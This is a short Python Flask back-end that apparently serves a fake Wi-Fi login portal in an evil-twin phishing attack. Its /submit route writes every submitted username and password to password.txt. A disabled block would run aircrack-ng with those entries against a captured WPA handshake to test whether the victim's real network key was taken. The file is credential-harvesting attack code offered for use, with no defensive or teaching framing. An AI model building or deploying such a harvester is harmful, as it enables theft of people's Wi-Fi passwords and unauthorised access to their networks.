# back-end server

from flask import Flask, render_template, request
from flask_cors import CORS
import sys, os, subprocess

app = Flask(__name__)
CORS(app)

webserver_directory = os.getcwd()
@app.route('/')
def hello():
    return 'Hello World'

@app.route('/submit', methods = ["POST"])
def submit():
    # Store Username & Password
    user_username = str(request.json["username"])
    user_password = str(request.json["password"])
    #print(webserver_directory, file=sys.stderr)
    password_directory = webserver_directory + "/password.txt"
    print("DEBUG: Password Directory = {}".format(password_directory), file=sys.stderr)
    with open(password_directory, 'a') as fileHandler:
        fileHandler.write("{}:{}".format(user_username,user_password))
        fileHandler.write('\n')
    """handshake_directory = '../handshake/handshake-01.cap'
    print("DEBUG: Handshake Directory = {}".format(handshake_directory, file=sys.stderr))
    with open('handshake_result.txt', 'w') as fileHandler:
        subprocess.run(['aircrack-ng', '-w', password_directory, handshake_directory], stdout=fileHandler)
    with open('handshake_result.txt', 'r') as fileHandler:
        aircrack_text = fileHandler.read()
        if 'KEY FOUND!' in aircrack_text:
            status = "pass"
            print("DEBUG: Status = Pass", file=sys.stderr)
        else:
            status = "fail"
            print("DEBUG: Status = Fail", file=sys.stderr)"""
    status = "pass"
    return {"status": status}
